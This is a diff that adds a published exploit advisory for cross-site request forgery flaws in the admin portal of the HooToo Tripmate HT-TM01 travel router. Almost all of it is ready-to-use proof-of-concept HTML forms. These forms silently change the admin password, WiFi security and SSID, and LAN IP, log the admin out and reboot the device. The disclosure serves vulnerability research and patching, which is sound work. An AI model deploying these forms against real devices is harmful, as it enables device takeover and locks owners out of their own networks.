@@ -1,0 +1,87 @@
+# Exploit Title: HooToo Tripmate HT-TM01 Cross Site Request Forgery
+# Date: 03Sep15
+# Exploit Author: Ken Smith
+# Contact: https://twitter.com/P4tchw0rk
+# Vendor Homepage: http://www.hootoo.com
+# Version: HT-TM01, version 2.000.022
+
+1. Description
+Various functions in the device's admin web portal are vulnerable to Cross
+Site Request Forgery. Proof-of-concept HTML has been provided. In order for
+changes in wireless settings/security (executed via CSRF) to apply, a save
+and reset must be execute either by the admin manually saving the settings
+through the portal or via the save and reset CSRF-vulnerable functions
+described below.
+
+2. Proof of Concept
+Change the device's hostname
+<form action="
+http://10.10.10.254/protocol.csp?fname=system&opt=host&function=set"
+method="POST">
+<input type="hidden" name="name" value="CSRF123" />
+<input type="submit" value="Submit request" />
+</form>
+
+Change the region
+<form action="
+http://10.10.10.254/protocol.csp?fname=net&opt=wifi_channel_region&function=set"
+method="POST">
+<input type="hidden" name="country" value="England" />
+<input type="submit" value="Submit request" />
+</form>
+
+Log the admin user out
+<form action="http://10.10.10.254/index.csp?fname=logout" method="POST">
+<input type="submit" value="Submit request" />
+</form>
+
+Change the admin portal password
+<form action="http://10.10.10.254/protocol.csp?fname=security&function=set"
+method="POST">
+<input type="hidden" name="name" value="admin" />
+<input type="hidden" name="opt" value="pwdmod" />
+<input type="hidden" name="pwd1" value="newpass" />
+<input type="hidden" name="pwd2" value="newpass" />
+<input type="submit" value="Submit request" />
+</form>
+
+Reboot the device
+<form action="http://10.10.10.254/protocol.csp">
+<input type="hidden" name="fname" value="system" />
+<input type="hidden" name="opt" value="setting" />
+<input type="hidden" name="action" value="reboot" />
+<input type="hidden" name="function" value="set" />
+<input type="hidden" name="r" value="0&#46;24464550580450606" />
+<input type="submit" value="Submit request" />
+</form>
+
+Save changed settings
+<form action="http://10.10.10.254/protocol.csp">
+<input type="hidden" name="fname" value="storage" />
+<input type="hidden" name="opt" value="listen&#95;disk" />
+<input type="hidden" name="function" value="get" />
+<input type="submit" value="Submit request" />
+</form>
+
+Change WiFi Security
+<form action="
+http://10.10.10.254/protocol.csp?fname=net&opt=wifi_ap&function=set"
+method="POST">
+<input type="hidden" name="mode" value="4" />
+<input type="hidden" name="channel" value="1" />
+<input type="hidden" name="security" value="4" />
+<input type="hidden" name="hide&#95;ssid" value="0" />
+<input type="hidden" name="HTBSSCoexistence" value="0" />
+<input type="hidden" name="SSID" value="CSRF" />
+<input type="hidden" name="passwd" value="Different&#45;password" />
+<input type="submit" value="Submit request" />
+</form>
+
+Change network information
+<form action="
+http://10.10.10.254/protocol.csp?fname=net&opt=wifi_lan_ip&function=set"
+method="POST">
+<input type="hidden" name="ip" value="10&#46;10&#46;10&#46;123" />
+<input type="hidden" name="mask" value="255&#46;255&#46;255&#46;0" />
+<input type="submit" value="Submit request" />
+</form>
